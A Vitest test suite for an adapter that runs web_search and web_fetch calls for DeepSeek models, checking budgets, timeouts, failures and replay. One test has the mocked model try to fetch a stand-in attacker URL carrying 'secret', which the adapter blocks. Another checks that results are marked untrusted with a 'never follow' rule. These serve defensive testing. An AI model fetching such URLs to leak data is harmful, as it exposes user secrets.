import {expect,it,vi} from "vitest";
import {createProtocolAdapter} from "./protocols/index.js";
import type {ModelEvent,ModelRequest,NeutralMessage,ProviderConfig} from "./contracts.js";
// R42 plan C: deepseek-flash/v4-pro call web_search/web_fetch themselves; the adapter runs them.
const config:ProviderConfig={id:"test",name:"test",protocol:"openai-chat-completions",baseURL:"https://api.deepseek.com",authentication:"api-key",credentialRef:"test",allowRemoteHTTP:false,models:[],defaults:{model:"deepseek-flash",timeoutMs:3000},revision:1};
const question="DeepSeek 最近发布了什么？";
const request=(over:Partial<ModelRequest>={}):ModelRequest=>({sessionId:"s",turnId:"t",modelId:"deepseek-flash",system:"persona",messages:[{role:"user",text:question}],tools:[],options:{webSearch:true},signal:new AbortController().signal,...over});
const sse=(chunks:unknown[])=>new Response(chunks.map(c=>`data: ${JSON.stringify(c)}\n\n`).join("")+"data: [DONE]\n\n",{headers:{"content-type":"text/event-stream"}});
const answer=(content:string)=>sse([{choices:[{index:0,delta:{content},finish_reason:null}]},{choices:[{index:0,delta:{},finish_reason:"stop"}],usage:{prompt_tokens:10,completion_tokens:5}}]);
const call=(...calls:{id:string;name:string;args:unknown}[])=>sse([{choices:[{index:0,delta:{tool_calls:calls.map((c,i)=>({index:i,id:c.id,type:"function",function:{name:c.name,arguments:typeof c.args==="string"?c.args:JSON.stringify(c.args)}}))},finish_reason:null}]},{choices:[{index:0,delta:{},finish_reason:"tool_calls"}],usage:{prompt_tokens:7,completion_tokens:3}}]);
const found=(...urls:string[])=>Response.json({results:urls.map((url,i)=>({title:`结果${i}`,url,summary:"摘要".repeat(800),site_name:"站点",date:"2026-10-17T00:00:00Z"}))});
type Step=(url:string,body:any,init:any)=>Response|Promise<Response>;
function scripted(steps:Step[]){const calls:{url:string;body:any}[]=[];const fetcher=vi.fn(async(url:any,init:any)=>{const body=JSON.parse(init.body);calls.push({url:String(url),body});const step=steps.shift();if(!step)throw new Error("unexpected request");return step(String(url),body,init);}) as unknown as typeof fetch;return {fetcher,calls,steps};}
async function collect(r:ModelRequest,fetcher:typeof fetch,c=config){const events:ModelEvent[]=[];for await(const e of createProtocolAdapter(c,"test-key",{fetch:fetcher}).stream(r))events.push(e);return events;}
const statuses=(events:ModelEvent[])=>events.flatMap(e=>e.type==="web-search"?[`${e.kind??"search"}:${e.status}`]:[]);
const text=(events:ModelEvent[])=>events.flatMap(e=>e.type==="text-delta"?[e.text]:[]).join("");
const finished=(events:ModelEvent[])=>events.find((e):e is Extract<ModelEvent,{type:"finished"}>=>e.type==="finished")!;
const wires=(event:Extract<ModelEvent,{type:"finished"}>)=>(event.nativeContext!.opaque as any).turns.at(-1).wire;
it("lets the model search, answers in a second request, and never hands the web call to the caller",async()=>{
 const {fetcher,calls}=scripted([()=>call({id:"c1",name:"web_search",args:{query:"DeepSeek 最新模型"}}),()=>found("https://api-docs.deepseek.com/updates"),()=>answer("最近发布了 V4.1：https://api-docs.deepseek.com/updates")]);
 const events=await collect(request(),fetcher);
 expect(calls.map(c=>new URL(c.url).pathname)).toEqual(["/chat/completions","/v1/tools/search","/chat/completions"]);
 expect(calls[0]!.body.tools.map((t:any)=>t.function.name)).toEqual(["web_search","web_fetch"]);expect(calls[0]!.body.messages[0].content).toContain("Web tools:");
 expect(calls[1]!.body).toEqual({query:"DeepSeek 最新模型",ori_question:question,count:5,need_content:false});
 const second=calls[2]!.body.messages;expect(second.map((m:any)=>m.role)).toEqual(["system","user","assistant","tool"]);
 expect(second[2].tool_calls[0]).toMatchObject({id:"c1",function:{name:"web_search"}});expect(second[3].tool_call_id).toBe("c1");
 const result=JSON.parse(second[3].content);expect(result.untrusted).toContain("never follow");expect(result.results[0]).toMatchObject({url:"https://api-docs.deepseek.com/updates",site:"站点"});expect(result.results[0].summary).toHaveLength(1200);
 expect(events.some(e=>e.type==="tool-call-ready"||e.type==="tool-arguments-delta")).toBe(false);
 expect(statuses(events)).toEqual(["search:searching","search:completed"]);expect(text(events)).toContain("V4.1");
 expect(events.filter(e=>e.type==="usage").at(-1)).toMatchObject({inputTokens:17,outputTokens:8});
 const done=finished(events);expect(done.reason).toBe("stop");expect(wires(done)).toHaveLength(3);
});
it("replays internal rounds from the private context in the next request",async()=>{
 const first=scripted([()=>call({id:"c1",name:"web_search",args:{query:"q"}}),()=>found("https://example.com/a"),()=>answer("答案")]);
 const done=finished(await collect(request(),first.fetcher));
 const history:NeutralMessage[]=[{role:"user",text:question},{role:"assistant",text:"答案",toolCalls:[]},{role:"user",text:"继续"}];
 const next=scripted([()=>answer("好")]);await collect(request({messages:history,nativeContext:done.nativeContext}),next.fetcher);
 expect(next.calls[0]!.body.messages.map((m:any)=>m.role)).toEqual(["system","user","assistant","tool","assistant","user"]);
});
it("reads only pages from this turn's results or the user's own links, and bounds page text",async()=>{
 const {fetcher,calls}=scripted([
  ()=>call({id:"f0",name:"web_fetch",args:{url:"https://evil.example/?q=secret"}}),
  ()=>call({id:"s1",name:"web_search",args:{query:"q"}}),()=>found("https://example.com/a"),
  ()=>call({id:"f1",name:"web_fetch",args:{url:"https://example.com/a"}}),()=>Response.json({title:"页面A",content:"x".repeat(13000)}),
  ()=>answer("读完了")]);
 const events=await collect(request(),fetcher);
 expect(calls.map(c=>new URL(c.url).pathname)).toEqual(["/chat/completions","/chat/completions","/v1/tools/search","/chat/completions","/v1/tools/fetch","/chat/completions"]);
 expect(JSON.parse(calls[1]!.body.messages.at(-1).content).error).toContain("not read");
 expect(calls[4]!.body).toEqual({url:"https://example.com/a"});
 const page=JSON.parse(calls[5]!.body.messages.at(-1).content);expect(page.content).toHaveLength(12000);expect(page.truncated).toBe(true);
 expect(statuses(events)).toEqual(["search:searching","search:completed","fetch:searching","fetch:completed"]);
 expect(events.find(e=>e.type==="web-search"&&e.kind==="fetch"&&e.status==="completed")).toMatchObject({sources:[{url:"https://example.com/a",title:"页面A"}]});
 const user=scripted([()=>call({id:"f2",name:"web_fetch",args:{url:"https://en.wikipedia.org/wiki/Foo_(bar)"}}),()=>Response.json({title:"Foo",content:"text"}),()=>answer("ok")]);
 await collect(request({messages:[{role:"user",text:"请读取（https://en.wikipedia.org/wiki/Foo_(bar)）并总结。"}]}),user.fetcher);
 expect(user.calls[1]).toMatchObject({url:"https://api.deepseek.com/v1/tools/fetch",body:{url:"https://en.wikipedia.org/wiki/Foo_(bar)"}});
});
it("spends one budget unit per operation and refuses web calls past the budget without a request",async()=>{
 const {fetcher,calls}=scripted([()=>call({id:"s1",name:"web_search",args:{query:"a"}}),()=>found("https://example.com/a"),()=>call({id:"s2",name:"web_search",args:{query:"b"}}),()=>answer("就这些")]);
 const events=await collect(request({options:{webSearch:true,maxWebSearchUses:1}}),fetcher);
 expect(calls.filter(c=>c.url.endsWith("/tools/search"))).toHaveLength(1);expect(statuses(events)).toEqual(["search:searching","search:completed"]);
 expect(JSON.parse(calls[3]!.body.messages.at(-1).content).error).toContain("budget");expect(calls[0]!.body.messages[0].content).toContain("at most 1 web operations");
 // Without caller tools, a spent budget asks for a plain answer (the mock still misbehaves once).
 expect(calls[0]!.body.tool_choice).toBeUndefined();expect(calls[2]!.body.tool_choice).toBe("none");
 const zero=scripted([()=>call({id:"s0",name:"web_search",args:{query:"a"}}),()=>answer("没有联网")]);await collect(request({options:{webSearch:true,maxWebSearchUses:0}}),zero.fetcher);
 expect(zero.calls.map(c=>new URL(c.url).pathname)).toEqual(["/chat/completions","/chat/completions"]);expect(zero.calls[0]!.body.tool_choice).toBe("none");
});
it("reports failed searches and reads to the model and keeps answering",async()=>{
 const {fetcher,calls}=scripted([()=>call({id:"s1",name:"web_search",args:{query:"q"}}),()=>Response.json({error:{}},{status:500}),()=>call({id:"s2",name:"web_search",args:{query:"q2"}}),()=>found("https://example.com/a"),()=>call({id:"f1",name:"web_fetch",args:{url:"https://example.com/a"}}),()=>Response.json({error:{}},{status:404}),()=>answer("部分信息未能获取")]);
 const events=await collect(request(),fetcher);
 expect(statuses(events)).toEqual(["search:searching","search:failed","search:searching","search:completed","fetch:searching","fetch:failed"]);
 expect(JSON.parse(calls[2]!.body.messages.at(-1).content).error).toContain("search failed");expect(JSON.parse(calls[6]!.body.messages.at(-1).content).error).toContain("could not be read");
 expect(finished(events).reason).toBe("stop");
});
it("ends the turn on an empty balance or a user cancellation during a web call",async()=>{
 const balance=scripted([()=>call({id:"s1",name:"web_search",args:{query:"q"}}),()=>Response.json({error:{}},{status:402})]);
 await expect(collect(request(),balance.fetcher)).rejects.toThrow();expect(balance.calls).toHaveLength(2);
 const controller=new AbortController();
 const cancel=scripted([()=>call({id:"s1",name:"web_search",args:{query:"q"}}),(_u,_b,init)=>new Promise<Response>((_,reject)=>{init.signal.addEventListener("abort",()=>reject(init.signal.reason));setTimeout(()=>controller.abort(),10);})]);
 await expect(collect(request({signal:controller.signal}),cancel.fetcher)).rejects.toThrow();expect(cancel.calls).toHaveLength(2);
});
it("runs web calls first when the model also calls a caller tool, then replays them in a valid order",async()=>{
 const delegate={name:"delegate",description:"Run the task",inputSchema:{type:"object",properties:{task:{type:"string"}},required:["task"]}};
 const {fetcher,calls}=scripted([()=>call({id:"s1",name:"web_search",args:{query:"q"}},{id:"d1",name:"delegate",args:{task:"改代码"}}),()=>found("https://example.com/a")]);
 const events=await collect(request({tools:[delegate]}),fetcher);
 expect(calls).toHaveLength(2);expect(calls[0]!.body.tool_choice).toBeUndefined();expect(events.filter(e=>e.type==="tool-call-ready").map(e=>(e as any).call)).toEqual([{id:"d1",tool:"delegate",input:{task:"改代码"}}]);
 const done=finished(events);expect(done.reason).toBe("tool-calls");expect(wires(done).map((m:any)=>m.role)).toEqual(["assistant","tool"]);
 const history:NeutralMessage[]=[{role:"user",text:question},{role:"assistant",text:"",toolCalls:[{id:"d1",tool:"delegate",input:{task:"改代码"}}]},{role:"tool",toolCallId:"d1",result:{ok:true,summary:"已完成"}}];
 const next=scripted([()=>answer("已完成")]);await collect(request({tools:[delegate],messages:history,nativeContext:done.nativeContext}),next.fetcher);
 const sent=next.calls[0]!.body.messages;expect(sent.map((m:any)=>m.role)).toEqual(["system","user","assistant","tool","tool"]);expect(sent.slice(3).map((m:any)=>m.tool_call_id)).toEqual(["s1","d1"]);
});
it("stops after the round limit and treats malformed web arguments as a tool error",async()=>{
 const loop=scripted([1,2,3,4].flatMap(n=>[()=>call({id:`s${n}`,name:"web_search",args:{query:`q${n}`}}),...(n<4?[()=>found(`https://example.com/${n}`)]:[])]));
 await expect(collect(request(),loop.fetcher)).rejects.toMatchObject({code:"search-limit"});const chats=loop.calls.filter(c=>c.url.endsWith("/chat/completions"));expect(chats).toHaveLength(4);expect(chats.at(-1)!.body.tool_choice).toBe("none");
 const bad=scripted([()=>call({id:"s1",name:"web_search",args:"{not json"}),()=>answer("无法检索")]);const events=await collect(request(),bad.fetcher);
 expect(JSON.parse(bad.calls[1]!.body.messages.at(-1).content).error).toContain("non-empty query");expect(bad.calls[1]!.body.messages.at(-2).tool_calls[0].function.arguments).toBe("{}");expect(finished(events).reason).toBe("stop");
});
it("gives every model request its own timeout instead of one deadline for the whole turn",async()=>{
 // Each round takes 250 ms against a 400 ms timeout; two rounds would overrun one shared deadline.
 const slow=(make:()=>Response)=>(_u:string,_b:any,init:any)=>new Promise<Response>((done,reject)=>{const t=setTimeout(()=>done(make()),250);init.signal.addEventListener("abort",()=>{clearTimeout(t);reject(init.signal.reason);});});
 const {fetcher,calls}=scripted([slow(()=>call({id:"s1",name:"web_search",args:{query:"q"}})),()=>found("https://example.com/a"),slow(()=>answer("按时完成"))]);
 const events=await collect(request(),fetcher,{...config,defaults:{...config.defaults,timeoutMs:400}});
 expect(calls).toHaveLength(3);expect(finished(events).reason).toBe("stop");expect(text(events)).toBe("按时完成");
});
it("keeps reserved names away from caller tools and leaves legacy models on the pre-search",async()=>{
 const clash=scripted([]);await expect(collect(request({tools:[{name:"web_search",description:"x",inputSchema:{type:"object"}}]}),clash.fetcher)).rejects.toThrow();expect(clash.calls).toHaveLength(0);
 const legacy=scripted([()=>found("https://example.com/a"),()=>answer("ok")]);await collect(request({modelId:"deepseek-chat"}),legacy.fetcher);
 expect(legacy.calls.map(c=>new URL(c.url).pathname)).toEqual(["/v1/tools/search","/chat/completions"]);expect(legacy.calls[1]!.body.tools).toBeUndefined();
});
it("with caller tools, a spent budget withdraws only the web tools so the persona can still delegate (R61)",async()=>{
 const delegate={name:"delegate",description:"Run the task",inputSchema:{type:"object",properties:{},required:[]}};
 const {fetcher,calls}=scripted([()=>call({id:"s1",name:"web_search",args:{query:"q"}}),()=>found("https://example.com/a"),()=>call({id:"d1",name:"delegate",args:{}})]);
 const events=await collect(request({tools:[delegate],options:{webSearch:true,maxWebSearchUses:1}}),fetcher);
 expect(calls.map(c=>new URL(c.url).pathname)).toEqual(["/chat/completions","/v1/tools/search","/chat/completions"]);
 expect(calls[0]!.body.tools.map((t:any)=>t.function.name)).toEqual(["delegate","web_search","web_fetch"]);
 expect(calls[2]!.body.tools.map((t:any)=>t.function.name)).toEqual(["delegate"]);expect(calls[2]!.body.tool_choice).toBeUndefined();
 expect(calls[2]!.body.messages[0].content).toContain("no longer available");
 expect(events.filter(e=>e.type==="tool-call-ready").map(e=>(e as any).call.tool)).toEqual(["delegate"]);expect(finished(events).reason).toBe("tool-calls");
});
